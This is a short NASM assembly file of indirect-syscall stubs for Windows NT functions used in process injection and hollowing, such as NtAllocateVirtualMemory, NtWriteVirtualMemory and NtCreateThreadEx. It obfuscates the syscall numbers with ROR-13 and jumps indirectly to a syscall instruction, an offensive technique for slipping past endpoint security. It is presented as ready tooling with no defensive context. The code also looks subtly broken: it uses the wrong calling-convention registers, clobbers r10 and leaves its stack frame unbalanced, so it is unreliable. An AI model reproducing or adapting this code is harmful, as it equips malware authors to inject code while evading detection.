; Advanced Syscall Obfuscation with ROP-based Indirect Calls
section .text

%define SYS_NtAllocateVirtualMemory 0x18
%define SYS_NtWriteVirtualMemory 0x3A
%define SYS_NtCreateThreadEx 0xC2
%define SYS_NtProtectVirtualMemory 0x50
%define SYS_NtUnmapViewOfSection 0x2A
%define SYS_NtQueryInformationProcess 0x19

extern GetSyscallNumber
extern syscall_instruction

global SysNtAllocateVirtualMemory
global SysNtWriteVirtualMemory
global SysNtCreateThreadEx
global SysNtProtectVirtualMemory
global SysNtUnmapViewOfSection
global SysNtQueryInformationProcess

; Macro for ROP-based syscall invocation
%macro ROP_SYSCALL 1
    push rbp
    mov rbp, rsp
    sub rsp, 40h
    
    ; Save parameters
    mov [rsp + 30h], r9
    mov [rsp + 28h], r8
    mov [rsp + 20h], rdx
    mov [rsp + 18h], rcx
    mov [rsp + 10h], rsi
    mov [rsp + 08h], rdi
    
    ; Get syscall number with ROR-13 obfuscation
    mov ecx, %1
    ror ecx, 13
    call GetSyscallNumber
    
    ; Restore parameters with permutation
    mov rdi, [rsp + 08h]
    mov rsi, [rsp + 10h]
    mov rcx, [rsp + 18h]
    mov rdx, [rsp + 20h]
    mov r8, [rsp + 28h]
    mov r9, [rsp + 30h]
    
    ; Call syscall via indirect jump
    lea r10, [syscall_instruction]
    jmp r10
%endmacro

SysNtAllocateVirtualMemory:
    ROP_SYSCALL SYS_NtAllocateVirtualMemory

SysNtWriteVirtualMemory:
    ROP_SYSCALL SYS_NtWriteVirtualMemory

SysNtCreateThreadEx:
    ROP_SYSCALL SYS_NtCreateThreadEx

SysNtProtectVirtualMemory:
    ROP_SYSCALL SYS_NtProtectVirtualMemory

SysNtUnmapViewOfSection:
    ROP_SYSCALL SYS_NtUnmapViewOfSection

SysNtQueryInformationProcess:
    ROP_SYSCALL SYS_NtQueryInformationProcess